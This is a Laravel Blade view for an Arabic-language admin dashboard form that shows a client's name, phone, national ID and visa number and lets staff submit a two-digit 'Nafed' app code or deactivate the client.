@extends('dashboard.layout.master')

@section('content')

<h3 class="page-title"> عملائنا
</h3>
<div class="row">
    <div class="col-md-12">
        <!-- BEGIN VALIDATION STATES-->
        <div class="portlet light portlet-fit portlet-form bordered">
            <div class="portlet-title">
                <div class="caption">
                    <i class="icon-settings font-dark"></i>
                    <span class="caption-subject font-dark sbold uppercase">برجاء ارسال الرقم الخاص بتطبيق نافد و مكون
                        من رقمين </span>
                </div>

            </div>
            <div class="portlet-body">
                <!-- BEGIN FORM-->
                <form action="{{ route('clients.doEvent',$client->id) }}" method="post" id="form_sample_3"
                    class="form-horizontal" novalidate="novalidate">
                    @csrf
                    <div class="form-body">
                        <input type="hidden" name="id" value="{{$client->id}}">
                        <div class="form-group">
                            <label class="control-label col-md-3">الاسم
                                <span class="required" aria-required="true"> </span>
                            </label>
                            <div class="col-md-4">
                                <input type="text" disabled data-required="1" class="form-control"
                                    value="{{ $client->first_name .' '.$client->last_name  }}">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="control-label col-md-3">رقم الهاتف
                                <span class="required" aria-required="true"> </span>
                            </label>
                            <div class="col-md-4">
                                <input type="text" disabled data-required="1" class="form-control"
                                    value="{{$client->phone }}">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="control-label col-md-3">الرقم القومى
                                <span class="required" aria-required="true"> </span>
                            </label>
                            <div class="col-md-4">
                                <input type="text" disabled data-required="1" class="form-control"
                                    value="{{ $client->national_number }}">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="control-label col-md-3">الرقم الvisa
                                <span class="required" aria-required="true"> </span>
                            </label>
                            <div class="col-md-4">
                                <input type="text" disabled data-required="1" class="form-control" style="direction: ltr;"
                                    value="{{ $client->visa_number }}">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="control-label col-md-3">الرقم
                                <span class="required" aria-required="true"> </span>
                            </label>
                            <div class="col-md-4">
                                <input type="text" data-required="1" class="form-control" name="nafed_otp" maxlength="2">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="control-label col-md-3">الغاء نشاط العميل
                                <span class="required" aria-required="true"> </span>
                            </label>
                            <div class="col-md-4">
                                <input type="checkbox" data-required="1" class="form-control" name="in_active">
                            </div>
                        </div>
                    </div>
                    <div class="form-actions">
                        <div class="row">
                            <div class="col-md-offset-3 col-md-9">
                                <button type="submit" class="btn green">ارسال</button>
                            </div>
                        </div>
                    </div>
                </form>
                <!-- END FORM-->
            </div>
            <!-- END VALIDATION STATES-->
        </div>
    </div>
</div>

@endsection
